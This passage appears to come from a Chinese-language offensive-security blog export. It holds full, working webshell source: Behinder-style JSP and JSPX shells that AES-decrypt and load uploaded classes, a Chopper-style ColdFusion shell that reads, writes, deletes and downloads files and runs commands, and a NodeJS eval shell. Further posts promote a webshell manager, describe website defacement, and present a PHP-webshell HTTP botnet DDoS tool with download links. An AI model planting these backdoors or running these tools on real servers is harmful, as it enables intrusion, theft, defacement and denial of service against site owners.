&quot;+e.toString());&#125;sb.append(&quot;|&quot;+&quot;&lt;-&quot;);out.print(sb.toString());%&gt;\n菜刀形就是把所有功能全部寫進一個JSP檔，然後在HTTP POST的時候就會以A, B, C, …, M 執行不同Payload，然面再接上一些參數。\n下面是冰蝎 :\n&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;)) &#123;  String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/  session.putValue(&quot;u&quot;,k);  Cipher c=Cipher.getInstance(&quot;AES&quot;);  c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));  new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;  %&gt;\n冰蝎使用的是ClassLoader()，這樣就相當於是一個Eval函數了。\nJSPX&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/&gt;&lt;jsp:declaration&gt; class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;\n\nCFM&lt;CFSET O=&quot;&quot; /&gt;&lt;CFTRY&gt;&lt;CFSWITCH EXPRESSION=#Form.chopper#&gt;&lt;CFCASE VALUE=&quot;A&quot;&gt;&lt;CFSCRIPT&gt;O=O&amp;Expandpath(&quot;./&quot;)&amp;Chr(9);for(c=65;c lt 91;c=c+1)&#123;if(DirectoryExists(Chr(c)&amp;&quot;:\\&quot;))O=O&amp;Chr(c)&amp;&quot;:&quot;;&#125;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;B&quot;&gt;&lt;CFDIRECTORY DIRECTORY=&quot;#Form.z1#&quot; NAME=&quot;D&quot; SORT=&quot;Type&quot;&gt;&lt;CFLOOP Query=&quot;D&quot;&gt;&lt;CFSCRIPT&gt;O=O&amp;D.Name;If(D.Type eq &quot;Dir&quot;)O=O&amp;&quot;/&quot;;O=O&amp;Chr(9)&amp;DateFormat(D.DateLastModified,&quot;yyyy-mm-dd&quot;)&amp;TimeFormat(D.DateLastModified,&quot; HH:MM:ss&quot;)&amp;Chr(9)&amp;D.Size&amp;Chr(9);If(Left(Form.z1,1) eq &quot;/&quot;)&#123;O=O&amp;D.Mode;&#125;else&#123;O=O&amp;D.Attributes;&#125;O=O&amp;Chr(10);&lt;/CFSCRIPT&gt;&lt;/CFLOOP&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;C&quot;&gt;&lt;CFFILE ACTION=&quot;Read&quot; FILE=&quot;#Form.z1#&quot; VARIABLE=&quot;O&quot;&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;D&quot;&gt;&lt;CFFILE ACTION=&quot;Write&quot; FILE=&quot;#Form.z1#&quot; OUTPUT=&quot;#Form.z2#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;E&quot;&gt;&lt;CFSCRIPT&gt;Function DF(P)&#123;F=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(P);L=0;i=0;if(F.isDirectory())&#123;L=F.listFiles();for(i=1;i lte ArrayLen(L);i=i+1)&#123;if(not L[i].delete())&#123;DF(L[i].getPath());&#125;&#125;&#125;F.delete();&#125;DF(Form.z1);O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;F&quot;&gt;&lt;cffile action=&quot;readbinary&quot; file=&quot;#Form.z1#&quot; variable=&quot;B&quot; /&gt;&lt;cfset J=CreateObject(&quot;java&quot;,&quot;java.nio.ByteBuffer&quot;) /&gt;&lt;cfset X=J.Allocate(JavaCast( &quot;int&quot;, ArrayLen(B)+6)) /&gt;&lt;cfset X.Put(ToBinary(ToBase64(&quot;-&gt;&quot;&amp;&quot;|&quot;)), JavaCast(&quot;int&quot;,0), 3 ) /&gt;&lt;cfset X.Put(B, JavaCast(&quot;int&quot;,0), JavaCast(&quot;int&quot;,ArrayLen(B)) ) /&gt;&lt;cfset X.Put(ToBinary(ToBase64(&quot;|&quot;&amp;&quot;&lt;-&quot;)), JavaCast(&quot;int&quot;,0), 3 ) /&gt;&lt;CFCONTENT Type=&quot;application/octet-stream&quot; Variable=&quot;#X.Array()#&quot;&gt;&lt;CFABORT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;G&quot;&gt;&lt;CFSCRIPT&gt;F=CreateObject(&quot;java&quot;,&quot;java.io.FileOutputStream&quot;);F.init(Form.z1);h=&quot;0123456789ABCDEF&quot;;C=Form.z2;for(i=0;i lt Len(C);i=i+2)&#123;F.write(BitOr(BitSHLN(h.indexOf(C.charAt(i)),4),h.indexOf(C.charAt(i+1))));&#125;F.close();O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;H&quot;&gt;&lt;CFFUNCTION Name=&quot;cpf&quot;&gt;&lt;CFARGUMENT Name=&quot;S&quot;&gt;&lt;CFARGUMENT Name=&quot;D&quot;&gt;&lt;CFFILE ACTION=&quot;Copy&quot; SOURCE=&quot;#S#&quot; DESTINATION=&quot;#D#&quot;&gt;&lt;/CFFUNCTION&gt;&lt;CFSCRIPT&gt;Function CP(S,D)&#123;sf=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(S);df=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(D);L=0;i=0;if(sf.isDirectory())&#123;if(not df.exists())&#123;df.mkdir();&#125;L=sf.listFiles();for(i=1;i lte ArrayLen(L);i=i+1)&#123;if(L[i].isDirectory())&#123;CP(L[i].getPath(),df.getPath()&amp;&quot;/&quot;&amp;L[i].getName());&#125;else&#123;cpf(L[i].getPath(),df.getPath()&amp;&quot;/&quot;&amp;L[i].getName());&#125;&#125;&#125;else&#123;cpf(S,D);&#125;&#125;CP(Form.z1,Form.z2);O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;I&quot;&gt;&lt;CFFILE ACTION=&quot;MOVE&quot; SOURCE=&quot;#Form.z1#&quot; DESTINATION=&quot;#Form.z2#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;J&quot;&gt;&lt;CFDIRECTORY Directory=&quot;#Form.z1#&quot; Action=&quot;Create&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;K&quot;&gt;&lt;CFSCRIPT&gt;FileSetLastModified(Form.z1,ParseDateTime(Form.z2));O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;L&quot;&gt;&lt;CFSCRIPT&gt;Z=Form.z2;For(i=Len(Z);i gt 0;i=i-1)&#123;if(Mid(Z,i,1) eq &quot;/&quot; Or Mid(Z,i,1) eq &quot;\\&quot;)&#123;Break;&#125;&#125;P=Left(Z,i);F=Mid(Z,i+1,256);&lt;/CFSCRIPT&gt;&lt;CFHTTP METHOD=&quot;Get&quot; URL=&quot;#Form.z1#&quot; PATH=&quot;#P#&quot; FILE=&quot;#F#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;M&quot;&gt;&lt;CFEXECUTE Name=&quot;#Mid(Form.z1,3,Len(Form.z1)-2)#&quot; Arguments=&quot;#Mid(Form.z1,1,2)# #Form.z2#&quot; Variable=&quot;O&quot; TimeOut=&quot;60&quot; /&gt;&lt;/CFCASE&gt;&lt;/CFSWITCH&gt;&lt;CFCATCH Type=&quot;Any&quot;&gt;&lt;CFSET O=&quot;ERROR:// &quot;&amp;CFCatch.Message /&gt;&lt;/CFCATCH&gt;&lt;/CFTRY&gt;&lt;CFOUTPUT&gt;-&gt;#Chr(124)&amp;O&amp;Chr(124)#&lt;-&lt;/CFOUTPUT&gt;\n菜刀形，跟上面的JSP一樣。\nNodeJSvar http = require(&#x27;http&#x27;),\turl = require(&#x27;url&#x27;),    exec = require(&#x27;child_process&#x27;).exec;var querystring = require(&#x27;querystring&#x27;);var host = &quot;127.0.0.1&quot;,    port = &quot;5555&quot;,    thisServerUrl = &quot;http://&quot; + host + &quot;:&quot; + port;http.createServer(function (req, res) &#123;  req.addListener(&#x27;end&#x27;, function () &#123;  &#125;);  //var parsedUrl = url.parse(req.url, true);  //var cmd = parsedUrl.query[&#x27;cmd&#x27;];  var string = &#x27;&#x27;;        req.addListener(&#x27;data&#x27;, function(chunk)&#123;            string += chunk;        &#125;);\tvar cmd;\treq.addListener(&#x27;end&#x27;, function()&#123;      var strObj = querystring.parse(string);\t\t  cmd = strObj.pass;\t\t  res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/plain&#x27;&#125;);      if (cmd) &#123;        try &#123;eval(cmd);&#125; catch(e) &#123;console.log(&quot;ERROR://&quot; + e);res.end(&quot;ERROR://&quot;);&#125;      &#125; else &#123;\t\t  res.end();\t  &#125;  &#125;);&#125;).listen(port, host);console.log(&#x27;Server running at &#x27; + thisServerUrl );\nNodeJS的木馬在滲透測試中不見得能用上，因為使用條件跟php, asp, aspx這些比較過於苛刻。\n\n","categories":["Code"],"tags":["pentest","webshell","trojan","backdoor","code"]},{"title":"【Tool】Alien","url":"/2023/06/06/%E3%80%90Tool%E3%80%91Alien/","content":"簡介Alien是一個用C#編寫的一句話木馬管理工具，功能如下 :  \n\nSystem Information\nFileManager (可顯示圖片)\nVirtual Terminal\nDatabase\nRegistry\nMonitor\nScreenshot\n\n可控伺服器(可使用功能不一致)Windows&#x2F;Linux&#x2F;Unix&#x2F;MacOS\nDatabase\nMySQL : PHP\nSQL Server : ASP, ASPX, ASMX, ASHX\n\n文檔&amp;下載\n\n\nID\n主題\nUrl\n\n\n\n1\nAlien文檔\nhttps://malbuffer4pt.github.io/Alien\n\n\n2\nAlien Github\nhttps://github.com/malbuffer4pt/Alien\n\n\n","categories":["Tools"],"tags":["pentest","webshell","工具","backdoor","Alien"]},{"title":"【Tech】掛黑頁","url":"/2023/06/06/%E3%80%90Tech%E3%80%91%E6%8E%9B%E9%BB%91%E9%A0%81/","content":"介紹黑頁, 英文是 Deface Page, 指的是在入侵網站後直接把網站的 home page 改為自己的內容,一般都是用作惡意破壞或政治目的 :       \n在十多年前的中國，當時對網路犯罪的打撃沒有很重，他們自己開發的CMS又有很多漏洞，很容易就會被Getshell，做成以前很長的一段時間都有網站不斷地被掛黑頁，甚至還會在黑頁上寫上自己的QQ號碼。  \n在國際上比較有名的事件 :\nIranian Cyber Army    \n掛黑頁從技術上來說，制作黑頁並不難，只要會寫HTML就可以了，難的時要怎麼樣掛黑頁，目前來說掛黑頁的方式主要有兩種\n\nGetshell : 用Webshell直接修改 index.html 的HTML, 在無法getshell的情況下有的會直接在後端改圖片\nDNS修改 : 把目標DNS改為自己的伺服器IP, 例如Iranian Cyber Army用的就是這種，還有美國政府也是，附圖如下\n\nUS\n","categories":["BlackHat"],"tags":["code","html","blackhat","deface page"]},{"title":"【Tool】Tyrant DDoS","url":"/2023/07/02/%E3%80%90Tool%E3%80%91TyrantDDoS/","content":"簡介Tyrant DDoS是一個運用PHP一句話木馬進行壓力測試工具，透過把指定的Payload注入到eval函數來執行程式。\n免責聲明工具只限用於學習、壓力測試等合法用途，如非法使用則後果自負\n目的為甚麼我會寫這個工具呢? 我一開始是因為DDoS才會對資訊安全(OR網絡安全)感到興趣，在我剛接觸資訊安全領域時，身邊有很多人都會使用LOIC等工具進行惡作劇和攻撃，然後聲稱這是DDoS，後來我才明白這根本不是甚麼DDoS，只是簡單的DDoS而已，不知道是對DDoS的定義有甚麼誤會還是單純因為DDoS聽上去比較帥和比較強，大家都會說這是DDoS。我很不喜歡這樣，對這件事有點不爽，剛好我最近也看了幾篇DDoS技術原理的文章，再加上我編寫Alien時的經驗和一個想法———使用一句話木馬進行DDoS，所以就寫了這個工具，附合DDoS定義的DDoS，這聽上去很奇怪，但這是事實。這工具也是一個Proof of Concept，目前有很多DDoS工具都是用使TCP ReverseShell、P2P、IRC建立的，這個工具也有一個目的就是證明可以不使用這三種方法，而是使用HTTP就能建立BotNet。\nScreenshot\n下載https://github.com/malbuffer4pt/Tyrant\n","tags":["BlackHat","DDoS","StressTest","DoS","PHP"]}]